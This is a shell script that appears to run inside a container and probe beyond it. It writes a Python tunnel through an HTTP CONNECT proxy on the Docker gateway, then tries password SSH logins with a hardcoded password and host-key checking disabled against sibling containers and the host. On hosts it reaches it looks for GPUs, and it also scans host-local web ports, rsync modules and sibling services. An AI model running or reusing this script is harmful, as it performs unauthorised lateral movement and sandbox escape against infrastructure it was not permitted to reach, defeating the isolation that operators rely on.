#!/bin/bash
set +e
echo "###P6START $(date -u)"
echo "=== TOOLS ==="; for c in ssh sshpass socat nc rsync curl python3 timeout setsid; do printf "%s=%s " "$c" "$(command -v $c >/dev/null && echo yes || echo no)"; done; echo
cat > /tmp/px.py <<'PY'
import socket,sys,select,os
host,port=sys.argv[1],int(sys.argv[2])
s=socket.create_connection(("172.17.0.1",1080),timeout=8); s.settimeout(None)
s.sendall(("CONNECT %s:%d HTTP/1.1\r\nHost: x\r\n\r\n"%(host,port)).encode())
buf=b""
while b"\r\n\r\n" not in buf:
    d=s.recv(1)
    if not d: sys.exit(1)
    buf+=d
if b" 200 " not in buf.split(b"\r\n")[0]:
    sys.exit(1)
os.set_blocking(s.fileno(),False)
os.set_blocking(0,False)
while True:
    r,_,_=select.select([s,0],[],[],60)
    if s in r:
        d=s.recv(65536)
        if not d: break
        sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
    if 0 in r:
        d=os.read(0,65536)
        if not d: break
        s.sendall(d)
PY
printf '%s\n' '/&S2)n@W1G' > /tmp/ap.sh; chmod +x /tmp/ap.sh
run_ssh(){ tgt="$1"; usr="$2"; port="$3"; pcmd="$4"; nm="$5"; echo "--- ssh $usr@$tgt:$port ($nm)"; ASK=""; [ -n "$pcmd" ] && ASK="-o ProxyCommand=python3\ /tmp/px.py\ %h\ %p"; SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=:0 timeout 45 setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=20 -o LogLevel=ERROR $ASK -p $port $usr@$tgt 'id 2>&1; hostname; nvidia-smi -L 2>&1 | head -10; ls /dev/nvidia* 2>/dev/null | wc -l; cat /proc/driver/nvidia/version 2>/dev/null | head -2; uptime' 2>&1 | head -25
}
echo "=== SIBLINGS ==="
run_ssh 172.17.0.3 root 22 "" sib3
run_ssh 172.17.0.7 root 22 "" sib7
run_ssh 172.17.0.3 ubuntu 22 "" sib3u
echo "=== HOST-SSH via proxy ==="
run_ssh 127.0.0.1 root 22 px host-root
echo "=== HOST-HTTP ==="
P="-x http://172.17.0.1:1080"
for u in "http://127.0.0.1:9999/" "http://127.0.0.1:9999/version" "http://127.0.0.1:9999/api" "http://127.0.0.1:8429/" "http://127.0.0.1:9100/" "http://127.0.0.1:2023/" "http://127.0.0.1:2025/" "http://127.0.0.1:6063/" "http://127.0.0.1:8081/" "http://127.0.0.1:10221/" "http://127.0.0.1:123/"; do echo "--- $u"; curl -s $P -m 8 -D - -o /tmp/hb.$$ "$u" 2>&1 | head -12; head -c 250 /tmp/hb.$$ 2>/dev/null; echo; done
echo "=== RSYNC ==="
python3 - <<'PY'
import socket
try:
    s=socket.create_connection(("172.17.0.1",1080),timeout=5); s.settimeout(8)
    s.sendall(b"CONNECT 127.0.0.1:1234 HTTP/1.1\r\nHost: x\r\n\r\n")
    b=b""
    while b"\r\n\r\n" not in b: b+=s.recv(1)
    s.sendall(b"@RSYNCD: 31.0\n"); print("srv:",s.recv(100))
    s.sendall(b"#list\n")
    d=b""
    t=0
    while t<3:
        try:
            x=s.recv(2000)
            if not x: break
            d+=x
            if b"@RSYNCD: EXIT" in d: break
        except Exception: break
    print(d.decode('utf-8','replace')[:1500])
    s.close()
except Exception as e: print("rsync err",e)
PY
echo "=== SIB-8080 ==="
for h in 172.17.0.3 172.17.0.4 172.17.0.7; do for u in / /health /api /version /docs /metrics; do echo "--- $h:8080$u"; curl -s -m 5 -o /tmp/sb.$$ -w "code=%{http_code} len=%{size_download}\n" "http://$h:8080$u"; head -c 180 /tmp/sb.$$; echo; done; done
echo "###P6END $(date -u)"
